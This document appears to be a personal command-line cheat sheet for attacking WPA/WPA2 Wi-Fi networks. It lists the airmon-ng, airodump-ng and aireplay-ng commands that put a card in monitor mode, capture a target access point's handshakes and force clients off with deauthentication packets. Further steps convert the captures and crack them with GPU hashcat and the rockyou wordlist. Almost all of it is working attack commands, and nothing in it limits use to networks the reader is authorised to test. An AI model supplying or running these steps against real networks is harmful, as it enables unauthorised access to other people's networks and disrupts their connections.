1. Find your network interface to use
   sudo airmon-ng
2. Put the network interface into monitor mode
   sudo airmon-ng start <interface>
   a. For AWUS036ACH you have to do this manually:
      sudo ip link set <interface name> down
      sudo iwconfig <interface name> mode monitor
      sudo ip link set <interface name> up
   b. If airmon-ng directly support it, it usually will require shutting down network manager and wpa_supplicant, then trying again
      sudo airmon-ng check kill
   b. Or you may need to manually stop the processes (Network-Manager apparently can't be stopped)
      sudo systemctl stop vmware-networks.service network.target wpa_supplicant.service 
3. Scan all APs
   sudo airodump-ng <monitor interface>
4. Pick one and target capture from it (or not and get a ridiculously large cap file that will need to be filtered
   sudo airodump-ng -c <channel num> --bssid <mac id of AP> -w <cap file prefix> <monitor interface>
5. While this is running, clients connecting will get listed at the bottom of the updating window.  For active attacks, force Deauth in a second window.
   sudo aireplay-ng -0 <number of deauths> -a <AP mac ID> -c <station/client mac ID> <monitor interface>
6. Stop capturing by ending the running airodump-ng
7. Convert to hccapx format for each cap file
   for F in *.cap ; do cap2hccapx ${F} $(basename -s .cap ${F}).hccapx ; done
   a. You should get reports from each of the files indicating if it has any captures in it.
8. Enable cuda support
   enableCUDA
9. Start cracking based on the data (-m 2500 is for WPA/WPA2)
   sudo cudahashcat -m 2500 -r <rules file>  -o <cracked password file> <hccapx file> <word list file>
   a. Probably use rockyou.txt wordlist
10. Disable cuda support
    disableCUDA
11. Restore the network device
    a. Reboot
    b. Or if AWUS036ACH:
       sudo ip link set <interface name> down
       sudo iwconfig <interface name> mode auto
       sudo ip link set <inteface name> up
